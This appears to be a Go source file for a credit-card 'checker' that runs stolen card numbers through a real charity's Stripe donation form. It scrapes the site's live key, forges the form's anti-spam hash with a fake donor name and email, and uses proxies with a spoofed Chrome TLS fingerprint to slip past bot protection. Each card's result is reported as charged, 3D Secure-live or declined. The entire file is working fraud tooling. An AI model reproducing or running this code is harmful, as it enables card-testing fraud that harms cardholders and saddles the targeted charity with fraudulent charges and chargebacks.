package stripe

import (
	"context"
	"crypto/md5"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	utls "github.com/refraction-networking/utls"
	"golang.org/x/net/http2"
)

// ─── Types ────────────────────────────────────────────────────────────────────

// StripeRequest holds all params for a single Stripe 1$ check
type StripeRequest struct {
	CC    string `json:"cc"`              // num|mm|yy|cvv
	Proxy string `json:"proxy,omitempty"` // http/socks5 proxy URL
}

// StripeResult is the structured response returned for every check
type StripeResult struct {
	CC          string  `json:"cc"`
	Status      string  `json:"status"`       // charged | 3d_required | declined | error
	Message     string  `json:"message"`
	DeclineCode string  `json:"decline_code,omitempty"`
	Gate        string  `json:"gate"`
	Elapsed     float64 `json:"elapsed"`
	Proxy       string  `json:"proxy,omitempty"`
}

// ─── Card Parser ─────────────────────────────────────────────────────────────

// parseCard splits "num|mm|yy|cvv" into parts, normalising year to 2-digit
func parseCard(cc string) (num, mm, yy, cvv string, ok bool) {
	cc = strings.TrimSpace(cc)
	re := regexp.MustCompile(`[|/:\s,]+`)
	parts := re.Split(cc, -1)
	if len(parts) < 3 {
		return "", "", "", "", false
	}
	num = regexp.MustCompile(`\D`).ReplaceAllString(parts[0], "")
	mm = regexp.MustCompile(`\D`).ReplaceAllString(parts[1], "")
	yy = regexp.MustCompile(`\D`).ReplaceAllString(parts[2], "")
	if len(parts) >= 4 {
		cvv = regexp.MustCompile(`\D`).ReplaceAllString(parts[3], "")
	}
	if len(mm) == 1 {
		mm = "0" + mm
	}
	// strip to 2-digit year
	if len(yy) == 4 {
		yy = yy[2:]
	}
	if len(num) < 12 || len(num) > 19 || len(mm) != 2 || len(yy) != 2 {
		return "", "", "", "", false
	}
	ok = true
	return
}

// ─── HTTP Client with uTLS (Chrome 120 fingerprint + HTTP/2 support) ─────────

type cachedConn struct {
	h2  *http2.ClientConn
	tls *utls.UConn
	raw net.Conn
}

type utlsTransport struct {
	spec    *utls.ClientHelloID
	proxy   func(*http.Request) (*url.URL, error)
	timeout time.Duration

	mu    sync.Mutex
	conns map[string]*cachedConn

	plainOnce sync.Once
	plainTr   *http.Transport
}

func (t *utlsTransport) getPlainTransport() *http.Transport {
	t.plainOnce.Do(func() {
		t.plainTr = &http.Transport{Proxy: t.proxy}
	})
	return t.plainTr
}

func (t *utlsTransport) dial(ctx context.Context, req *http.Request, host, addr string) (*utls.UConn, net.Conn, error) {
	var rawConn net.Conn
	var err error

	if t.proxy != nil {
		proxyURL, pErr := t.proxy(req)
		if pErr == nil && proxyURL != nil {
			rawConn, err = dialThroughProxy(ctx, proxyURL, addr)
		} else {
			rawConn, err = (&net.Dialer{}).DialContext(ctx, "tcp", addr)
		}
	} else {
		rawConn, err = (&net.Dialer{}).DialContext(ctx, "tcp", addr)
	}
	if err != nil {
		return nil, nil, fmt.Errorf("dial %s: %w", addr, err)
	}

	tlsConn := utls.UClient(rawConn, &utls.Config{
		ServerName:         host,
		InsecureSkipVerify: true,
	}, *t.spec)

	if err := tlsConn.HandshakeContext(ctx); err != nil {
		rawConn.Close()
		return nil, nil, fmt.Errorf("tls handshake %s: %w", host, err)
	}

	return tlsConn, rawConn, nil
}

func dialThroughProxy(ctx context.Context, proxyURL *url.URL, target string) (net.Conn, error) {
	proxyAddr := proxyURL.Host
	if !strings.Contains(proxyAddr, ":") {
		proxyAddr = net.JoinHostPort(proxyAddr, "80")
	}

	conn, err := (&net.Dialer{}).DialContext(ctx, "tcp", proxyAddr)
	if err != nil {
		return nil, fmt.Errorf("proxy dial: %w", err)
	}

	connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n", target, target)
	if proxyURL.User != nil {
		user := proxyURL.User.Username()
		pass, _ := proxyURL.User.Password()
		auth := base64.StdEncoding.EncodeToString([]byte(user + ":" + pass))
		connectReq += "Proxy-Authorization: Basic " + auth + "\r\n"
	}
	connectReq += "\r\n"

	if _, err := conn.Write([]byte(connectReq)); err != nil {
		conn.Close()
		return nil, err
	}

	buf := make([]byte, 4096)
	n, err := conn.Read(buf)
	if err != nil {
		conn.Close()
		return nil, err
	}
	resp := string(buf[:n])
	if len(resp) < 12 || resp[9] != '2' {
		conn.Close()
		return nil, fmt.Errorf("proxy CONNECT failed: %s", resp[:min(len(resp), 80)])
	}

	return conn, nil
}

func (t *utlsTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	if req.URL.Scheme != "https" {
		return t.getPlainTransport().RoundTrip(req)
	}

	host := req.URL.Hostname()
	port := req.URL.Port()
	if port == "" {
		port = "443"
	}
	addr := net.JoinHostPort(host, port)

	ctx := req.Context()
	if t.timeout > 0 {
		var cancel context.CancelFunc
		ctx, cancel = context.WithTimeout(ctx, t.timeout)
		defer cancel()
	}

	t.mu.Lock()
	if t.conns == nil {
		t.conns = make(map[string]*cachedConn)
	}
	cc := t.conns[addr]
	t.mu.Unlock()

	if cc != nil && cc.h2 != nil {
		if cc.h2.CanTakeNewRequest() {
			resp, err := cc.h2.RoundTrip(req)
			if err == nil {
				return resp, nil
			}
			t.mu.Lock()
			if t.conns[addr] == cc {
				delete(t.conns, addr)
			}
			t.mu.Unlock()
			cc.tls.Close()
		} else {
			t.mu.Lock()
			if t.conns[addr] == cc {
				delete(t.conns, addr)
			}
			t.mu.Unlock()
		}
	}

	tlsConn, rawConn, err := t.dial(ctx, req, host, addr)
	if err != nil {
		return nil, err
	}

	alpn := tlsConn.ConnectionState().NegotiatedProtocol

	if alpn == "h2" {
		h2Transport := &http2.Transport{
			DisableCompression: false,
			AllowHTTP:          false,
		}
		h2cc, err := h2Transport.NewClientConn(tlsConn)
		if err != nil {
			tlsConn.Close()
			return nil, fmt.Errorf("h2 client conn: %w", err)
		}

		entry := &cachedConn{h2: h2cc, tls: tlsConn, raw: rawConn}
		t.mu.Lock()
		t.conns[addr] = entry
		t.mu.Unlock()

		resp, err := h2cc.RoundTrip(req)
		if err != nil {
			t.mu.Lock()
			if t.conns[addr] == entry {
				delete(t.conns, addr)
			}
			t.mu.Unlock()
			tlsConn.Close()
			return nil, err
		}
		return resp, nil
	}

	connTransport := &http.Transport{
		DialTLSContext: func(_ context.Context, _, _ string) (net.Conn, error) {
			return tlsConn, nil
		},
		DisableKeepAlives: true,
	}

	resp, err := connTransport.RoundTrip(req)
	if err != nil {
		tlsConn.Close()
		return nil, err
	}
	return resp, nil
}

func buildClient(proxyURL string, timeout time.Duration) *http.Client {
	jar, _ := cookiejar.New(nil)
	var proxyFunc func(*http.Request) (*url.URL, error)
	if proxyURL != "" {
		proxyURL = normaliseProxy(proxyURL)
		if parsed, err := url.Parse(proxyURL); err == nil {
			proxyFunc = http.ProxyURL(parsed)
		}
	}
	return &http.Client{
		Timeout: timeout,
		Jar:     jar,
		Transport: &utlsTransport{
			spec:    &utls.HelloChrome_120,
			proxy:   proxyFunc,
			timeout: timeout,
		},
	}
}

// normaliseProxy converts host:port:user:pass or bare host:port into http://... form
func normaliseProxy(p string) string {
	p = strings.TrimSpace(p)
	if p == "" {
		return ""
	}
	lower := strings.ToLower(p)
	if strings.HasPrefix(lower, "http://") || strings.HasPrefix(lower, "https://") ||
		strings.HasPrefix(lower, "socks5://") || strings.HasPrefix(lower, "socks4://") {
		return p
	}
	// host:port:user:pass (no @ sign)
	if !strings.Contains(p, "@") {
		parts := strings.Split(p, ":")
		if len(parts) == 4 {
			return fmt.Sprintf("http://%s:%s@%s:%s", parts[2], parts[3], parts[0], parts[1])
		}
	}
	return "http://" + p
}

// ─── HappyForms anti-spam hash ───────────────────────────────────────────────

func happyFormsHash(fields []struct{ value string }) string {
	joined := ""
	nonWord := regexp.MustCompile(`\W`)
	for _, f := range fields {
		joined += f.value
	}
	stripped := nonWord.ReplaceAllString(joined, "")
	return fmt.Sprintf("%x", md5.Sum([]byte(stripped)))
}

// ─── Core Stripe 1$ Check Flow ───────────────────────────────────────────────

const (
	gateURL  = "https://belovedcommunity.org/donate/"
	gate     = "belovedcommunity.org"
	formID   = "1127"
	postID   = "142"
	ua       = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)

// CheckStripe performs the full Stripe 1$ donation flow and returns a StripeResult.
// proxyURL is optional — pass "" for direct connect.
func CheckStripe(req StripeRequest) StripeResult {
	start := time.Now()
	client := buildClient(req.Proxy, 25*time.Second)

	num, mm, yy, cvv, ok := parseCard(req.CC)
	if !ok {
		return errResult(req, "error", "Invalid card format (use num|mm|yy|cvv)", "", start)
	}
	masked := fmt.Sprintf("%s%s%s", num[:6], strings.Repeat("x", len(num)-10), num[len(num)-4:])

	// ── Step 1: Fetch gate page → pk_live + random_seed ──────────────────────
	pageResp, err := doGET(client, gateURL, nil)
	if err != nil && req.Proxy != "" {
		// Fallback to direct client if proxy failed to connect
		directClient := buildClient("", 25*time.Second)
		pageResp, err = doGET(directClient, gateURL, nil)
	}
	if err != nil {
		return errResult(req, "error", "Gate fetch failed: "+err.Error(), "", start)
	}
	html := string(pageResp)

	pkLive := regexp.MustCompile(`pk_live_[a-zA-Z0-9]+`).FindString(html)
	if pkLive == "" && req.Proxy != "" {
		// Proxy returned bot challenge / JS protection without pk_live; fetch gate via direct connection
		directClient := buildClient("", 25*time.Second)
		if directResp, err2 := doGET(directClient, gateURL, nil); err2 == nil {
			directHTML := string(directResp)
			if directPk := regexp.MustCompile(`pk_live_[a-zA-Z0-9]+`).FindString(directHTML); directPk != "" {
				html = directHTML
				pkLive = directPk
			}
		}
	}
	if pkLive == "" {
		snippet := html
		if len(snippet) > 200 {
			snippet = snippet[:200]
		}
		return errResult(req, "error", "pk_live not found on gate page: "+snippet, "", start)
	}

	seedMatch := regexp.MustCompile(`name=["']happyforms_random_seed["']\s+value=["'](\d+)["']`).FindStringSubmatch(html)
	if seedMatch == nil {
		seedMatch = regexp.MustCompile(`happyforms_random_seed[^>]*value=["'](\d+)["']`).FindStringSubmatch(html)
	}
	if seedMatch == nil {
		return errResult(req, "error", "random_seed not found on gate page", "", start)
	}
	randomSeed := seedMatch[1]

	activeFormID := "1194"
	formIDMatch := regexp.MustCompile(`name=["']happyforms_form_id["']\s+value=["'](\d+)["']`).FindStringSubmatch(html)
	if formIDMatch == nil {
		formIDMatch = regexp.MustCompile(`happyforms_form_id[^>]*value=["'](\d+)["']`).FindStringSubmatch(html)
	}
	if formIDMatch != nil {
		activeFormID = formIDMatch[1]
	}

	activePostID := "142"
	postIDMatch := regexp.MustCompile(`name=["']current_post_id["']\s+value=["'](\d+)["']`).FindStringSubmatch(html)
	if postIDMatch == nil {
		postIDMatch = regexp.MustCompile(`current_post_id[^>]*value=["'](\d+)["']`).FindStringSubmatch(html)
	}
	if postIDMatch != nil {
		activePostID = postIDMatch[1]
	}

	// ── Step 2: Create Stripe PaymentMethod ──────────────────────────────────
	pmPayload := url.Values{}
	pmPayload.Set("type", "card")
	pmPayload.Set("card[number]", num)
	pmPayload.Set("card[exp_month]", mm)
	pmPayload.Set("card[exp_year]", "20"+yy)
	pmPayload.Set("card[cvc]", cvv)

	pmHeaders := map[string]string{
		"Content-Type": "application/x-www-form-urlencoded",
		"User-Agent":   ua,
	}
	// Use pk_live as Basic-auth username
	pmReq, _ := http.NewRequest("POST", "https://api.stripe.com/v1/payment_methods", strings.NewReader(pmPayload.Encode()))
	for k, v := range pmHeaders {
		pmReq.Header.Set(k, v)
	}
	pmReq.SetBasicAuth(pkLive, "")

	pmHTTP, err := client.Do(pmReq)
	if err != nil {
		return errResult(req, "error", "Stripe PM creation failed: "+err.Error(), "", start)
	}
	defer pmHTTP.Body.Close()
	pmBody, _ := io.ReadAll(pmHTTP.Body)

	var pmMap map[string]any
	json.Unmarshal(pmBody, &pmMap)

	// Handle Stripe PM errors (invalid card, expired, etc.)
	if errMap, ok2 := pmMap["error"].(map[string]any); ok2 {
		code, _ := errMap["code"].(string)
		msg, _ := errMap["message"].(string)
		dc, _ := errMap["decline_code"].(string)
		return StripeResult{
			CC: masked, Status: "declined", Message: msg,
			DeclineCode: dc + " | " + code, Gate: gate,
			Elapsed: time.Since(start).Seconds(), Proxy: req.Proxy,
		}
	}

	pmID, _ := pmMap["id"].(string)
	if pmID == "" {
		return errResult(req, "error", "Payment method ID not received from Stripe", "", start)
	}

	// ── Step 3: Submit HappyForms donation → get payment_intent client_secret ─
	// Build hash fields in exact order
	hashFields := []struct{ value string }{
		{"happyforms_message"},
		{gateURL},
		{activePostID},
		{activeFormID},
		{"0"},
		{randomSeed},
		{""},                      // single_line_text
		{"James Smith"},           // single_line_text_2
		{"frabsosgk9@gmail.com"},  // email_3
		{"5"},                     // payments amount
		{"stripe"},                // payment_method
		{"1"},                     // filled
		{""},                      // single_line_text_4
	}
	formHash := happyFormsHash(hashFields)

	formData := url.Values{}
	formData.Set("action", "happyforms_message")
	formData.Set("happyforms_client_referer", gateURL)
	formData.Set("happyforms_current_post_id", activePostID)
	formData.Set("happyforms_form_id", activeFormID)
	formData.Set("happyforms_step", "0")
	formData.Set("happyforms_random_seed", randomSeed)
	formData.Set(activeFormID+"-single_line_text", "")
	formData.Set(activeFormID+"_single_line_text_2", "James Smith")
	formData.Set(activeFormID+"_email_3", "frabsosgk9@gmail.com")
	formData.Set(activeFormID+"_payments_1[price]", "5")
	formData.Set(activeFormID+"_payments_1[payment_method]", "stripe")
	formData.Set(activeFormID+"_payments_1[filled]", "1")
	formData.Set(activeFormID+"_single_line_text_4", "")
	formData.Set("hash", formHash)
	formData.Set("platform_info[user_agent]", ua)
	formData.Set("platform_info[app_version]", "5.0 (Windows)")
	formData.Set("platform_info[language]", "en-US")
	formData.Set("platform_info[languages_length]", "2")
	formData.Set("platform_info[webdriver]", "0")
	formData.Set("platform_info[concurrency]", "8")
	formData.Set("platform_info[outer_width]", "1920")
	formData.Set("platform_info[outer_height]", "1080")
	formData.Set("platform_info[connectionRtt]", "100")

	// Set cookies preserving session cookies from Step 1 with raw double quotes
	u, _ := url.Parse(gateURL)
	var existingCookies []string
	if client.Jar != nil {
		for _, c := range client.Jar.Cookies(u) {
			existingCookies = append(existingCookies, c.Name+"="+c.Value)
		}
	}
	stripeMID := generateUUID()
	stripeSID := generateUUID()
	pmCookie := fmt.Sprintf(`{"payment_method":"%s"}`, pmID)

	existingCookies = append(existingCookies,
		"__stripe_mid="+stripeMID,
		"__stripe_sid="+stripeSID,
		fmt.Sprintf("happyforms_%s_stripe_checkout=%s", activeFormID, pmCookie),
	)
	cookieHeader := strings.Join(existingCookies, "; ")

	formHeaders := map[string]string{
		"Content-Type":     "application/x-www-form-urlencoded; charset=UTF-8",
		"Origin":           "https://belovedcommunity.org",
		"Referer":          gateURL,
		"User-Agent":       ua,
		"X-Requested-With": "XMLHttpRequest",
		"Cookie":           cookieHeader,
	}

	formBody, err := doPOST(client, gateURL, formData.Encode(), formHeaders)
	if err != nil && req.Proxy != "" {
		directClient := buildClient("", 25*time.Second)
		formBody, err = doPOST(directClient, gateURL, formData.Encode(), formHeaders)
	}
	if err != nil {
		return errResult(req, "error", "Form submit failed: "+err.Error(), "", start)
	}

	bodyStr := string(formBody)
	if req.Proxy != "" && (strings.Contains(bodyStr, "One moment, please...") || strings.Contains(bodyStr, "Please wait while your request is being verified")) {
		directClient := buildClient("", 25*time.Second)
		if directBody, err2 := doPOST(directClient, gateURL, formData.Encode(), formHeaders); err2 == nil {
			bodyStr = string(directBody)
			formBody = directBody
		}
	}

	secretMatch := regexp.MustCompile(`pi_[a-zA-Z0-9_]+_secret_[a-zA-Z0-9_]+`).FindString(bodyStr)
	if secretMatch == "" {
		if strings.Contains(bodyStr, "Thank you for your donation") || strings.Contains(bodyStr, "happyforms-message-notice success") {
			return StripeResult{
				CC: masked, Status: "charged",
				Message: "Payment succeeded - card charged $5",
				Gate:    gate, Elapsed: time.Since(start).Seconds(), Proxy: req.Proxy,
			}
		}
		errNotice := regexp.MustCompile(`happyforms-part-error-notice[^>]*>([^<]+)`).FindStringSubmatch(bodyStr)
		if errNotice != nil && len(errNotice) > 1 {
			return StripeResult{
				CC: masked, Status: "declined",
				Message: strings.TrimSpace(errNotice[1]),
				Gate:    gate, Elapsed: time.Since(start).Seconds(), Proxy: req.Proxy,
			}
		}

		snippet := bodyStr
		if len(snippet) > 400 {
			snippet = snippet[:400]
		}
		return errResult(req, "error", "Payment intent secret not found in form response: "+snippet, "", start)
	}
	intentID := strings.Split(secretMatch, "_secret_")[0]

	// ── Step 4: Confirm payment intent with Stripe ────────────────────────────
	confirmPayload := url.Values{}
	confirmPayload.Set("payment_method", pmID)
	confirmPayload.Set("expected_payment_method_type", "card")
	confirmPayload.Set("use_stripe_sdk", "true")
	confirmPayload.Set("key", pkLive)
	confirmPayload.Set("client_attribution_metadata[client_session_id]", "stripe-go-api-session")
	confirmPayload.Set("client_attribution_metadata[merchant_integration_source]", "l1")
	confirmPayload.Set("client_secret", secretMatch)

	confirmHeaders := map[string]string{
		"Content-Type": "application/x-www-form-urlencoded",
		"Origin":       "https://js.stripe.com",
		"Referer":      "https://js.stripe.com/",
		"User-Agent":   ua,
		"Accept":       "application/json",
	}

	confirmURL := fmt.Sprintf("https://api.stripe.com/v1/payment_intents/%s/confirm", intentID)
	confirmBody, err := doPOST(client, confirmURL, confirmPayload.Encode(), confirmHeaders)
	if err != nil {
		return errResult(req, "error", "Stripe confirm request failed: "+err.Error(), "", start)
	}

	var confirmMap map[string]any
	json.Unmarshal(confirmBody, &confirmMap)

	status, _ := confirmMap["status"].(string)

	switch status {
	case "succeeded":
		return StripeResult{
			CC: masked, Status: "charged",
			Message: "Payment succeeded - card charged $1",
			Gate:    gate, Elapsed: time.Since(start).Seconds(), Proxy: req.Proxy,
		}
	case "requires_action":
		return StripeResult{
			CC: masked, Status: "3d_required",
			Message: "3D Secure authentication required - card is live",
			Gate:    gate, Elapsed: time.Since(start).Seconds(), Proxy: req.Proxy,
		}
	}

	// Parse decline error
	errMap, _ := confirmMap["error"].(map[string]any)
	if errMap == nil {
		errMap, _ = confirmMap["last_payment_error"].(map[string]any)
	}
	if errMap != nil {
		msg, _ := errMap["message"].(string)
		code, _ := errMap["code"].(string)
		dc, _ := errMap["decline_code"].(string)
		return StripeResult{
			CC: masked, Status: "declined", Message: msg,
			DeclineCode: dc, Gate: gate,
			Elapsed: time.Since(start).Seconds(), Proxy: req.Proxy,
		}
		_ = code
	}

	return errResult(req, "error", "Unexpected Stripe response: "+string(confirmBody[:min(200, len(confirmBody))]), "", start)
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

func errResult(req StripeRequest, status, msg, dc string, start time.Time) StripeResult {
	return StripeResult{
		CC: req.CC, Status: status, Message: msg,
		DeclineCode: dc, Gate: gate,
		Elapsed: time.Since(start).Seconds(), Proxy: req.Proxy,
	}
}

func doGET(client *http.Client, rawURL string, headers map[string]string) ([]byte, error) {
	req, err := http.NewRequest("GET", rawURL, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Sec-Ch-Ua", `"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"`)
	req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
	req.Header.Set("Sec-Ch-Ua-Platform", `"Windows"`)
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

func doPOST(client *http.Client, rawURL, body string, headers map[string]string) ([]byte, error) {
	req, err := http.NewRequest("POST", rawURL, strings.NewReader(body))
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Sec-Ch-Ua", `"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"`)
	req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
	req.Header.Set("Sec-Ch-Ua-Platform", `"Windows"`)
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func generateUUID() string {
	b := make([]byte, 16)
	rand.Read(b)
	b[6] = (b[6] & 0x0f) | 0x40
	b[8] = (b[8] & 0x3f) | 0x80
	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:])
}
